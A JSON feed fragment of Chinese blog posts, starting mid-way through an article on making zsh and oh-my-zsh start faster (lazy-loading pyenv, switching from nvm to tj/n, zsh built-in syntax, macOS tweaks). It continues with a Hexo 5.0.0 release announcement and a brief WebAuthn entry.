的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将 […]","link":"https://flyhigher.top/develop/2160.html"}]